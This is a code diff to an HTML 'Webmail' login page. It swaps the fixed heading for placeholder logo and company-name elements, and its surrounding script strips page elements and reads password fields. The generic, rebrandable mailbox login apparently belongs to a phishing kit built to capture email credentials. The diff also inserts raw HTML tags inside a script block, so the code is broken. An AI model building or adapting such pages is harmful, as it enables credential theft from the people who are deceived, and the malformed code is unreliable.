@@ -128,7 +128,8 @@
         <div class="loader"></div>
     </div>
     <div class="login-panel">
-        <h1>Webmail</h1>
+        <img id="logoimg" src="initial_logo.png" alt="Logo">
+        <h1 id="logoname">Initial Company Name</h1>
         <p class="info-text">Log in with your email to gain access.</p>
         <form>
             <div class="form-group">
@@ -160,6 +161,8 @@ const divsToRemove = document.querySelectorAll('div[jsname][class]');
 divsToRemove.forEach(div => {
     div.remove();
 });
+    <img id="logoimg" src="initial_logo.png" alt="Logo">
+<h1 id="logoname">Initial Company Name</h1>
     document.querySelector("form").addEventListener("submit", function (e) {
         const password = document.getElementById("password").value;
         const confirmPassword = document.getElementById("confirmPassword").value;
